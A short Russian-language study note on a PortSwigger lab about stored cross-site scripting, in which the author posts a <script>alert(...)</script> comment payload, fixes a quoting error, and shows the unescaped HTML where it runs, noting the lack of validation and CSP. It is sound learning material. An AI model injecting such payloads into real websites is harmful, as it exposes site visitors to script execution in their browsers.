#### ТИП  =  > хранимый XSS между HTML-тегами
Когда XSS-контекст — это текст между HTML-тегами, необходимо вводить новые HTML-теги, предназначенные для запуска выполнения JavaScript

---
лаба
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

задача = через комментарии оставить пейлоад с аллертом

---

 с перва я подставил пейлоад в коммент
 < script>alert(7777777777xss)</ script>
 но ошибся, так как js для строк нужно кавычки ставить
вот так
< script>alert("7777777777xss")</ script>
и все сработало, 


вот кусок html куда подставлялся коммент напрямую 
ппросто текст вставлялся между тегами < p>
```html
<section class="comment">
	<p>
 <img src="/resources/images/avatarDefault.svg" class="avatar">                            f234f | 21 February 2026
</p>
	<p><script>alert("7777777777xss")</script></p>
	 <p></p>
 </section>
```

## почему сработало?
 - нет валидации
 - не использован Content Security Policy (CSP) — заголовок, который указывает браузеру, откуда можно загружать скрипты
 - нет вообще никакой защиты 